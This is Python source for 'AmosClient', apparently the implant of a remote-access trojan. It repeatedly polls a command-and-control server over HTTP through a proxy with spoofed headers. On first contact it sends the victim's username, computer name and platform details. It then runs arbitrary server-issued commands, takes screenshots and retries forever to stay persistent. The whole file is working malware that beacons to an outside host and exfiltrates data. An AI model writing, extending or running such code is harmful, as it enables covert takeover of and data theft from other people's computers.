import os
from time import time, sleep
from requests import get, post, exceptions
from ServerHandler import ServerHandler
from DataHarvester import DataHarvester
from GeneralFeatures import GeneralFeatures
from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER, CMD_REQUEST,
                             CMD_RESPONSE, RESPONSE_KEY, DELAY, CLIENT_CREDENTIALS)


class AmosClient:

    def __init__(self):
        self.server_handler = ServerHandler(SERVER_IP, SERVER_PORT)
        self.data_harvester = DataHarvester()
        self.general_features = GeneralFeatures()
        self.credentials_sent = False


    def start(self):
        client = (os.getenv("USERNAME", "Unknown_Username") + "@" + os.getenv("COMPUTERNAME", "Unknown_Computername"))

        # Try an HTTP GET request to the c2 server and retrieve a command; if it fails, keep trying forever
        while True:
            try:
                response = get(f"http://{SERVER_IP}:{SERVER_PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)

                if response.status_code == 200 and self.credentials_sent == False:
                    platform_info = self.data_harvester.get_platform_info()
                    self.server_handler.post_to_server(platform_info, CLIENT_CREDENTIALS)
                    self.credentials_sent = True

                if response.status_code == 404:
                    raise exceptions.RequestException

            except exceptions.RequestException:
                sleep(DELAY)
                continue  # send timeout signal

            # Retrieve server command via the decoded content of the response object
            command = response.content.decode()
            print(command)

            if 'terminate' in command:
                break

            # Ignore keep-alive command to prevent spam
            if command == "time /T":
                continue

            # Send file
            elif 'get' in command:
                try:
                    res = self.data_harvester.get_platform_info()
                    print(res)
                except:
                    pass

            elif command == "screenshot":
                self.general_features.screenshot( )
                # self.server_handler.send_file("screenshot.png")
                if os.path.isfile("screenshot.png"):
                    os.remove("screenshot.png")
            else:
                self.server_handler.run_command(command)

            print(response.status_code)


client = AmosClient()
client.start()
